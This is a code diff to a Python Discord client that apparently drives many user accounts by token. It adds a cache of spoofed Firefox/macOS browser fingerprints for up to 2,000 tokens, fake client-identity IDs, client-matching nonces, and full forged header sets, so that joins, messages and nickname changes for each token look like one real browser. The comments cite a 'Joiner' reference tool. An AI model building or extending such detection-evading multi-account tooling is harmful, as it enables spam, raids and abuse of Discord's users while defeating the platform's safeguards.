@@ -5,6 +5,7 @@ import logging
 import random
 import re
 import secrets
+import time
 import uuid
 from dataclasses import asdict
 from datetime import datetime, timezone
@@ -34,6 +35,72 @@ _FIREFOX_RE = re.compile(r'Firefox/([\d.]+)')
 _CONTEXT_PROPERTIES = base64.b64encode(
     json.dumps({'location': 'Join Guild'}, separators=(',', ':')).encode()
 ).decode()
+
+# ---------------------------------------------------------------------------
+# Per-token fingerprint cache
+# ---------------------------------------------------------------------------
+# Each token is assigned one stable _TokenFP instance on first use.  All API
+# actions (join, send_message, patch nickname, etc.) pull their browser
+# identity headers from this cache so every request for the same token looks
+# like the same browser/device — matching the Joiner reference implementation.
+
+_TOKEN_FP_MAX_SIZE = 2000  # evict oldest entry when full
+
+
+class _TokenFP:
+    """Stable per-token fingerprint profile used across all API actions."""
+
+    __slots__ = ('user_agent', 'browser_version', 'client_identity', 'locale', 'fingerprint')
+
+    def __init__(
+        self,
+        user_agent: str,
+        browser_version: str,
+        client_identity: dict,
+        locale: str,
+        fingerprint: dict,
+    ) -> None:
+        self.user_agent = user_agent
+        self.browser_version = browser_version
+        self.client_identity = client_identity
+        self.locale = locale
+        self.fingerprint = fingerprint
+
+
+# Module-level per-token fingerprint cache (keyed by token value string).
+_TOKEN_FP_CACHE: dict[str, _TokenFP] = {}
+
+
+def _make_token_fingerprint(locale: str = 'en-US') -> _TokenFP:
+    """Generate a new _TokenFP using the globally cached FingerprintGenerator."""
+    fp = asdict(_FINGERPRINT_GENERATOR.generate(browser='firefox', os='macos'))
+    navigator = fp.get('navigator') or {}
+    user_agent = navigator.get('userAgent') or ''
+    browser_version = '0'
+    uda = navigator.get('userAgentData')
+    if uda and uda.get('brands'):
+        browser_version = str(uda['brands'][-1].get('version', '0'))
+    else:
+        m = _FIREFOX_RE.search(user_agent)
+        if m:
+            browser_version = m.group(1)
+    client_identity = {
+        k: str(uuid.uuid4())
+        for k in ('client_launch_id', 'launch_signature', 'client_heartbeat_session_id')
+    }
+    return _TokenFP(
+        user_agent=user_agent,
+        browser_version=browser_version,
+        client_identity=client_identity,
+        locale=locale,
+        fingerprint=fp,
+    )
+
+
+def _generate_nonce() -> str:
+    """Snowflake-based nonce matching the Discord web client (docs/Joiner send.py)."""
+    timestamp = int(time.time() * 1000) - 1420070400000
+    return str(timestamp << 22)
 
 
 def _build_user_agent(chrome_version: str) -> str:
@@ -136,6 +203,78 @@ class DiscordClient:
                 return response.json()
             except httpx.HTTPError:
                 return {'id': guild_id, 'name': 'Unknown (discord api unavailable)'}
+
+    # ------------------------------------------------------------------
+    # Per-token fingerprint helpers
+    # ------------------------------------------------------------------
+
+    def _get_token_fingerprint(self, token: str, locale: str = 'en-US') -> _TokenFP:
+        """Return the cached fingerprint for *token*, creating it if absent.
+
+        When creating a new fingerprint the supplied *locale* is used.  If the
+        fingerprint already exists and a non-default locale is supplied the
+        locale is updated in place so all subsequent requests for that token
+        use the correct locale after the first ``/users/@me`` fetch.
+        """
+        cached = _TOKEN_FP_CACHE.get(token)
+        if cached is not None:
+            if locale and locale != 'en-US' and cached.locale != locale:
+                cached.locale = locale
+            return cached
+        # Evict the oldest entry when the cache is full.
+        if len(_TOKEN_FP_CACHE) >= _TOKEN_FP_MAX_SIZE:
+            try:
+                _TOKEN_FP_CACHE.pop(next(iter(_TOKEN_FP_CACHE)))
+            except StopIteration:
+                pass
+        new_fp = _make_token_fingerprint(locale=locale)
+        _TOKEN_FP_CACHE[token] = new_fp
+        return new_fp
+
+    def _discord_headers(
+        self,
+        token: str,
+        *,
+        content_type: bool = False,
+        referer: str | None = None,
+        context_properties: str | None = None,
+    ) -> dict:
+        """Build complete Discord HTTP headers for a user-token request.
+
+        Uses the per-token fingerprint from ``_TOKEN_FP_CACHE`` so that every
+        action for the same token (join, send_message, patch nickname, etc.)
+        presents a consistent browser identity to Discord — matching the
+        Joiner reference implementation's ``tls_client.Session`` approach.
+        """
+        fp = self._get_token_fingerprint(token)
+        accept_lang = (
+            f'{fp.locale},en;q=0.9'
+            if fp.locale and fp.locale != 'en-US'
+            else 'en-US,en;q=0.9'
+        )
+        headers: dict = {
+            'Authorization': token,
+            'User-Agent': fp.user_agent,
+            'X-Super-Properties': _build_fingerprint_super_properties(
+                fp.fingerprint, fp.browser_version, fp.client_identity, locale=fp.locale
+            ),
+            'X-Discord-Locale': fp.locale,
+            'X-Discord-Timezone': 'America/New_York',
+            'x-debug-options': 'bugReporterEnabled',
+            'Accept': '*/*',
+            'Accept-Language': accept_lang,
+            'Origin': 'https://discord.com',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+        }
+        if content_type:
+            headers['Content-Type'] = 'application/json'
+        if referer:
+            headers['Referer'] = referer
+        if context_properties:
+            headers['X-Context-Properties'] = context_properties
+        return headers
 
     async def get_guild_onboarding(self, guild_id: str, token: str) -> dict:
         """Return the onboarding config for a guild, using a user token."""
